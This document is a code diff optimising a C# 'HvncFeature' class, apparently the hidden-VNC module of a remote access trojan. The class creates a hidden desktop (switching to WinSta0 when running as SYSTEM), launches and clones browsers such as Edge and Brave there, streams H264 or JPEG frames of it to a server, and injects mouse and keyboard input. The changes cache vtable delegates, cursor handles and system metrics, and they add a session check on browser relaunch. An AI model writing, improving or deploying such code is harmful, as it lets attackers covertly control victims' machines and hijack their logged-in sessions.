@@ -207,6 +207,11 @@ internal static class HvncFeature
     [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint VtRelease(nint pThis);
     [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int  VtSeek(nint pThis, long move, uint origin, ref long newPos);
     [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int  VtRead(nint pThis, nint pv, uint cb, out uint cbRead);
+    // Cached IStream vtable delegates — SHCreateMemStream instances share the same vtable,
+    // so we pay GetDelegateForFunctionPointer only on the very first JPEG encode.
+    private static VtRelease? _vtRelease;
+    private static VtSeek?    _vtSeek;
+    private static VtRead?    _vtRead;
 
     // ── Structs ───────────────────────────────────────────────────────────────
 
@@ -294,7 +299,12 @@ internal static class HvncFeature
     private static readonly List<nint> _captureStale = new(4);
 
     // Composite DIBSection at canvas resolution
-    private static nint _compHdcRef; // reference DC (physical screen)
+    private static nint _compHdcRef;  // reference DC (physical screen)
+    private static nint   _hArrowCursor;              // IDC_ARROW handle — cached, shared, never destroyed
+    private static int    _smCxSizeFrame = -1;        // SM_CXSIZEFRAME — constant per session
+    private static int    _smCyCaption   = -1;        // SM_CYCAPTION   — constant per session
+    private static string _h264Prefix = "";            // "{\"W\":W,\"H\":H,\"D\":\"" — rebuilt each Start()
+    private static string _jpegPrefix = "";            // "{\"W\":W,\"H\":H,\"J\":\"" — rebuilt each Start()
     private static nint _compHdc;
     private static nint _compHbm;
     private static nint _compBits;  // raw pointer to composite pixels
@@ -336,7 +346,9 @@ internal static class HvncFeature
     // Modifier key state — tracked by HandleKey, used by VkToChars
     private static bool _shiftDown, _ctrlDown, _altDown, _capsLock, _numLock;
     private static readonly byte[] _vkState = new byte[256];
-    private static readonly System.Text.StringBuilder _vkSb = new(8);
+    private static readonly System.Text.StringBuilder _vkSb        = new(8);
+    private static readonly System.Text.StringBuilder _classSb     = new(128);
+    private static readonly uint[]                    _bmiColorsBuf = new uint[4]; // reused by every MakeBmi call
 
     // H264 encoder — null when unavailable (falls back to JPEG)
     private static H264Encoder? _h264Enc;
@@ -363,8 +375,12 @@ internal static class HvncFeature
         // Use actual screen resolution — ignore server's requested dimensions
         int sw = GetSystemMetrics(0); // SM_CXSCREEN
         int sh = GetSystemMetrics(1); // SM_CYSCREEN
-        _canvasW = sw > 0 ? sw : 1920;
-        _canvasH = sh > 0 ? sh : 1080;
+        _canvasW        = sw > 0 ? sw : 1920;
+        _canvasH        = sh > 0 ? sh : 1080;
+        _h264Prefix     = "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"D\":\"";
+        _jpegPrefix     = "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"J\":\"";
+        _smCxSizeFrame  = -1; // refresh system metrics cache on next use (DPI may have changed)
+        _smCyCaption    = -1;
 
         // When running as SYSTEM the process lives in the non-interactive window station.
         // Switch to WinSta0 so the hidden desktop is created in the interactive station
@@ -621,7 +637,7 @@ internal static class HvncFeature
                                 {
                                     // Manual JSON — avoids JsonSerializer internal buffers + frame object alloc
                                     _send?.Invoke((int)PacketType.HvncH264Frame,
-                                        "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"D\":\"" + Convert.ToBase64String(h264) + "\"}");
+                                        _h264Prefix + Convert.ToBase64String(h264) + "\"}");
                                 }
                                 else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                             }
@@ -645,7 +661,7 @@ internal static class HvncFeature
                                 var jpeg = EncodeJpeg(_compBits, _canvasW, _canvasH, _canvasW * 4);
                                 if (jpeg != null)
                                     _send?.Invoke((int)PacketType.HvncFrame,
-                                        "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"J\":\"" + Convert.ToBase64String(jpeg) + "\"}");
+                                        _jpegPrefix + Convert.ToBase64String(jpeg) + "\"}");
                                 else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                             }
                         }
@@ -745,9 +761,9 @@ internal static class HvncFeature
         // Draw a standard arrow cursor at the tracked position.
         // Using LoadCursor(IDC_ARROW) avoids GetCursor()/GetCursorInfo() returning
         // unexpected shapes from the capture thread context on a hidden desktop.
-        nint hArrow = LoadCursor(0, (nint)32512); // IDC_ARROW = 32512
-        if (hArrow != 0 && _curX >= 0 && _curY >= 0 && _curX < w && _curY < h)
-            DrawIconEx(_compHdc, _curX, _curY, hArrow, 0, 0, 0, 0, 3 /*DI_NORMAL*/);
+        if (_hArrowCursor == 0) _hArrowCursor = LoadCursor(0, (nint)32512); // IDC_ARROW — shared handle, no DestroyIcon
+        if (_hArrowCursor != 0 && _curX >= 0 && _curY >= 0 && _curX < w && _curY < h)
+            DrawIconEx(_compHdc, _curX, _curY, _hArrowCursor, 0, 0, 0, 0, 3 /*DI_NORMAL*/);
 
         ulong hash = CompHash((byte*)_compBits, w, h);
         _compositeUnchanged = hash == _lastCompHash;
@@ -843,7 +859,7 @@ internal static class HvncFeature
             biBitCount    = 32,
             biCompression = BI_RGB
         },
-        bmiColors = new uint[4]
+        bmiColors = _bmiColorsBuf
     };
 
     // ── JPEG encoding ─────────────────────────────────────────────────────────
@@ -865,22 +881,24 @@ internal static class HvncFeature
             };
             var clsid = JpegClsid;
             GdipSaveImageToStream(bmp, stream, ref clsid, (nint)(&ep));
-            var vtSeek = Marshal.GetDelegateForFunctionPointer<VtSeek>((*(nint**)stream)[5]);
-            var vtRead = Marshal.GetDelegateForFunctionPointer<VtRead>((*(nint**)stream)[3]);
+            // Cache vtable delegates on first call — all SHCreateMemStream instances share the same vtable.
+            _vtRelease ??= Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2]);
+            _vtSeek    ??= Marshal.GetDelegateForFunctionPointer<VtSeek>   ((*(nint**)stream)[5]);
+            _vtRead    ??= Marshal.GetDelegateForFunctionPointer<VtRead>   ((*(nint**)stream)[3]);
 
             // Seek to end to get size, then seek back to start — one alloc, one read
             long size = 0;
-            vtSeek(stream, 0, 2 /*STREAM_SEEK_END*/, ref size);
-            if (size <= 0) { Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream); return null; }
+            _vtSeek(stream, 0, 2 /*STREAM_SEEK_END*/, ref size);
+            if (size <= 0) { _vtRelease(stream); return null; }
             long pos = 0;
-            vtSeek(stream, 0, 0 /*STREAM_SEEK_SET*/, ref pos);
+            _vtSeek(stream, 0, 0 /*STREAM_SEEK_SET*/, ref pos);
 
             var result = new byte[size];
             fixed (byte* pResult = result)
             {
                 uint cbRead = 0;
-                vtRead(stream, (nint)pResult, (uint)size, out cbRead);
-                Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream);
+                _vtRead(stream, (nint)pResult, (uint)size, out cbRead);
+                _vtRelease(stream);
                 if (cbRead == 0) return null;
             }
             return result;
@@ -899,9 +917,9 @@ internal static class HvncFeature
 
     private static string WinClass(nint hwnd)
     {
-        var sb = new System.Text.StringBuilder(128);
-        GetClassName(hwnd, sb, 128);
-        return sb.ToString();
+        _classSb.Clear();
+        GetClassName(hwnd, _classSb, 128);
+        return _classSb.ToString();
     }
 
     // Converts a VK to character(s) using our tracked modifier state.
@@ -1173,7 +1191,7 @@ internal static class HvncFeature
         nint lParam   = MakeLParam(cPt.x, cPt.y);
         nint scrParam = MakeLParam(x, y);
 
-        StubLog.Debug($"[Mouse] btn={button} down={down} ({x},{y}) hwnd=0x{hwnd:X} [{WinClass(hwnd)}] cPt=({cPt.x},{cPt.y})");
+        StubLog.Debug($"[Mouse] btn={button} down={down} ({x},{y}) hwnd=0x{hwnd:X} [{cls}] cPt=({cPt.x},{cPt.y})");
 
         switch (button)
         {
@@ -1190,7 +1208,7 @@ internal static class HvncFeature
                     _lastClickX = x;
                     _lastClickY = y;
 
-                    StubLog.Info($"[Mouse] {(isDbl ? "DBLCLICK" : "LDOWN")} → 0x{hwnd:X} [{WinClass(hwnd)}]");
+                    StubLog.Info($"[Mouse] {(isDbl ? "DBLCLICK" : "LDOWN")} → 0x{hwnd:X} [{cls}]");
                     if (useSync)
                     {
                         // Qt needs WM_MOUSEMOVE processed before DOWN so hover/underMouse state
@@ -1447,8 +1465,9 @@ internal static class HvncFeature
         // For HTCAPTION / 0: apply geometry to detect system buttons vs draggable area.
         // Standard Win32 windows return HTCAPTION for the title bar but not for individual buttons.
         if (!GetWindowRect(root, out var wr)) return hit;
-        int border = GetSystemMetrics(8);  // SM_CXSIZEFRAME
-        int cy     = GetSystemMetrics(4);  // SM_CYCAPTION
+        if (_smCxSizeFrame < 0) { _smCxSizeFrame = GetSystemMetrics(8); _smCyCaption = GetSystemMetrics(4); }
+        int border = _smCxSizeFrame;
+        int cy     = _smCyCaption;
         int btnW   = cy * 2;               // ≈46px at 100% DPI
         int barTop = wr.top;
         int barBot = wr.top + cy + border;
@@ -2450,11 +2469,12 @@ internal static class HvncFeature
             // isRetry guard prevents chaining: the retry itself never schedules another retry.
             if (!isRetry && pi.dwProcessId != 0 && exeBase is "msedge.exe" or "brave.exe" or "explorer.exe")
             {
-                var retryPid = pi.dwProcessId; var retryBase = exeBase; var retryPath = path; var retryClone = cloneBrowser;
+                var retryPid     = pi.dwProcessId; var retryBase = exeBase; var retryPath = path; var retryClone = cloneBrowser;
+                int retrySession = _sessionId; // capture current session — bail if Stop()/Start() cycles before the 3 s delay
                 Task.Run(async () =>
                 {
                     await Task.Delay(3000);
-                    if (_hDesktop == 0 || IsProcessAlive(retryPid)) return;
+                    if (_sessionId != retrySession || _hDesktop == 0 || IsProcessAlive(retryPid)) return;
                     StubLog.Info($"[HVNC] '{retryBase}' exited in <3 s — retrying once");
                     _launchedPids.TryRemove(retryBase, out _);
                     LaunchOnDesktop(retryPath, isRetry: true, cloneBrowser: retryClone);
